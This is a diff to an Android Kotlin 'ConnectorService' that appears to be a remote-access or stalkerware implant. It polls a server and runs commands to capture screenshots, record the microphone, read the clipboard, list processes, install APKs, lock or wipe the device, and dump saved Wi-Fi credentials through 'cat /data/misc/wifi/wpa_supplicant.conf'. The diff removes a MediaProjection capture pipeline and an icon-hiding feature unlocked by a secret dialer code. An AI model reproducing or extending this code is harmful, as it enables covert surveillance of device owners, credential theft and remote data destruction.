@@ -41,9 +41,6 @@ class ConnectorService : Service() {
         const val CHANNEL_ID = "connector_channel"
         const val NOTIF_ID = 1001
         const val ACTION_STOP = "ACTION_STOP"
-        const val ACTION_SETUP_MEDIA_PROJECTION = "ACTION_SETUP_MEDIA_PROJECTION"
-        const val EXTRA_MP_RESULT_CODE = "mp_result_code"
-        const val EXTRA_MP_DATA = "mp_data"
         var isRunning = false
     }
 
@@ -60,10 +57,6 @@ class ConnectorService : Service() {
     private var polling = false
     private var wakeLock: PowerManager.WakeLock? = null
     private var pollThread: Thread? = null
-
-    // ── Screenshot Pipeline ────────────────────────────────────────────────
-    @Volatile private var pipelinedFrame: String? = null
-    private var pipelineThread: Thread? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -86,20 +79,7 @@ class ConnectorService : Service() {
         }
         deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
 
-        // Handle MediaProjection setup request dari MainActivity (Android 14+ only)
-        if (intent?.action == ACTION_SETUP_MEDIA_PROJECTION) {
-            val resultCode = intent.getIntExtra(EXTRA_MP_RESULT_CODE, -1)
-            @Suppress("DEPRECATION")
-            val data: android.content.Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                intent.getParcelableExtra(EXTRA_MP_DATA, android.content.Intent::class.java)
-            else intent.getParcelableExtra(EXTRA_MP_DATA)
-            if (resultCode != -1 && data != null) {
-                setupMediaProjectionInService(resultCode, data)
-            }
-            return START_STICKY
-        }
-
-        // Guard: jangan restart polling jika sudah berjalan (misalnya dipanggil dari hideAndExit)
+        // Guard: jangan restart polling jika sudah berjalan
         if (polling) {
             return START_STICKY
         }
@@ -118,37 +98,10 @@ class ConnectorService : Service() {
         return START_STICKY
     }
 
-    private fun setupMediaProjectionInService(resultCode: Int, data: android.content.Intent) {
-        // PENTING: Jangan panggil startForeground() dengan FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-        // di sini! Pada Android 14 (API 34), memanggil startForeground(MEDIA_PROJECTION) pada
-        // service yang SUDAH berjalan menyebabkan OS-level SecurityException yang TIDAK bisa
-        // di-catch oleh try-catch Java → process langsung di-kill → crash loop.
-        //
-        // Root cause dari crash loop di logcat:
-        //   SecurityException: Starting FGS with type mediaProjection ...
-        //   at ConnectorService.onStartCommand(Unknown Source:178)
-        //
-        // Solusi: Hanya update notifikasi (tetap DATA_SYNC), lalu ambil MediaProjection
-        // langsung tanpa mengubah FGS type. MediaProjection token sendiri masih valid.
-        try {
-            // Update notifikasi saja — TANPA mengubah FGS type ke MEDIA_PROJECTION
-            updateNotification("Connected · Screen ▶", true)
-
-            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
-            val proj = mgr.getMediaProjection(resultCode, data)
-            val metrics = applicationContext.resources.displayMetrics
-            MediaProjectionHolder.setup(applicationContext, proj, metrics)
-            log("✅ MediaProjection aktif")
-        } catch (e: Exception) {
-            log("⚠️ MediaProjection setup gagal: ${e.message}")
-        }
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         polling = false
         isRunning = false
-        stopPipeline()
         pollThread?.interrupt()
         wakeLock?.release()
 
@@ -180,7 +133,6 @@ class ConnectorService : Service() {
             log("🆔 ID: $deviceId")
             var failCount = 0
             var lastHeartbeatAt = 0L
-            var lastWasScreenshot = false
             while (polling) {
                 try {
                     val now = System.currentTimeMillis()
@@ -193,23 +145,16 @@ class ConnectorService : Service() {
                         log("📥 CMD: ${cmd.command}")
                         val (result, type) = executeCommand(cmd.command, cmd.extra)
                         sendResult(cmd.id, cmd.command, result, type)
-                        lastWasScreenshot = cmd.command.startsWith("screenshot")
-                    } else {
-                        lastWasScreenshot = false
                     }
                     failCount = 0
                 } catch (e: InterruptedException) {
                     break
                 } catch (e: Exception) {
                     failCount++
-                    lastWasScreenshot = false
                     log("⚠️ ${e.message}")
                     if (failCount > 5) updateNotification("Server unreachable…", false)
                 }
-                if (!lastWasScreenshot) {
-                    stopPipeline()
-                    try { Thread.sleep(500) } catch (e: InterruptedException) { break }
-                }
+                try { Thread.sleep(500) } catch (e: InterruptedException) { break }
             }
         }.also { it.isDaemon = true; it.start() }
     }
@@ -307,10 +252,6 @@ class ConnectorService : Service() {
             // ── Processes ──
             cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
 
-            // ── App visibility ──
-            cmd == "hide_app" || cmd == "hide_icon"   -> Pair(toggleAppVisibility(true), "command_result")
-            cmd == "unhide_app" || cmd == "show_icon" -> Pair(toggleAppVisibility(false), "command_result")
-
             // ── Device control ──
             cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
             cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
@@ -319,17 +260,12 @@ class ConnectorService : Service() {
             cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
             cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
 
-            // ── Screenshot — MediaProjection pipeline ──────────────────────
+            // ── Screenshot ──
             cmd.startsWith("screenshot") -> {
-                val parts  = cmd.split(":")
-                val maxW   = parts.getOrNull(1)?.toIntOrNull() ?: 720
-                val qual   = parts.getOrNull(2)?.toIntOrNull() ?: 70
-
-                val frame = pipelinedFrame?.also { pipelinedFrame = null }
-                    ?: takeScreenshot(maxW, qual)
-
-                startPipelineCapture(maxW, qual)
-                Pair(frame, "command_result")
+                val parts = cmd.split(":")
+                val maxW  = parts.getOrNull(1)?.toIntOrNull() ?: 720
+                val qual  = parts.getOrNull(2)?.toIntOrNull() ?: 70
+                Pair(takeScreenshot(maxW, qual), "command_result")
             }
 
             // ── Mic recording ──
@@ -347,19 +283,13 @@ class ConnectorService : Service() {
     }
 
     // ─────────────────────────────────────────
-    //  SCREENSHOT — MediaProjection only
+    //  SCREENSHOT — screencap
     // ─────────────────────────────────────────
 
     private fun takeScreenshot(maxWidth: Int = 720, quality: Int = 70): String {
         val tmpPath = "${cacheDir.absolutePath}/.sc_${System.currentTimeMillis()}.png"
         return try {
-            // Strategy 1: MediaProjection (fastest, no shell, hardware-accelerated)
-            if (MediaProjectionHolder.isAvailable()) {
-                val frame = MediaProjectionHolder.captureFrameBase64(maxWidth, quality, 600)
-                if (frame != null && !frame.startsWith("ERROR")) return frame
-            }
-
-            // Strategy 2: screencap stdout — no disk I/O, no root needed
+            // Strategy 1: screencap stdout — no disk I/O, no root needed
             try {
                 val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
                 val exited = proc.waitFor(3, TimeUnit.SECONDS)
@@ -373,7 +303,7 @@ class ConnectorService : Service() {
                 proc.destroy()
             } catch (_: Exception) {}
 
-            // Strategy 3: screencap to file (last resort)
+            // Strategy 2: screencap to file (last resort)
             try {
                 java.io.File(tmpPath).delete()
                 runShell("screencap -p $tmpPath")
@@ -385,7 +315,7 @@ class ConnectorService : Service() {
                 }
             } catch (_: Exception) {}
 
-            "ERROR: Screenshot gagal. Aktifkan MediaProjection permission di app."
+            "ERROR: Screenshot gagal."
         } catch (e: Exception) {
             try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
             "ERROR: ${e.message}"
@@ -406,22 +336,6 @@ class ConnectorService : Service() {
             bmp.recycle()
             android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
         } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    private fun stopPipeline() {
-        pipelineThread?.interrupt()
-        pipelineThread = null
-        pipelinedFrame = null
-    }
-
-    private fun startPipelineCapture(maxW: Int, qual: Int) {
-        if (pipelineThread?.isAlive == true) return
-        pipelineThread = Thread {
-            try {
-                val frame = takeScreenshot(maxW, qual)
-                if (!frame.startsWith("ERROR")) pipelinedFrame = frame
-            } catch (_: InterruptedException) {}
-        }.also { it.isDaemon = true; it.start() }
     }
 
     // ─────────────────────────────────────────
@@ -645,17 +559,6 @@ class ConnectorService : Service() {
                 configs.forEach { cfg -> appendLine("SSID: ${cfg.SSID?.replace("\"", "") ?: "?"}") }
             }
         } catch (e: Exception) { runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'") }
-    }
-
-    // ─────────────────────────────────────────
-    //  APP VISIBILITY
-    // ─────────────────────────────────────────
-
-    private fun toggleAppVisibility(hide: Boolean): String {
-        return try {
-            if (hide) { AppIcon.hide(this); "✅ Ikon disembunyikan. Ketik *#2719# di dialer untuk tampilkan kembali." }
-            else { AppIcon.show(this); "✅ Ikon tampil kembali." }
-        } catch (e: Exception) { "Error: ${e.message}" }
     }
 
     // ─────────────────────────────────────────
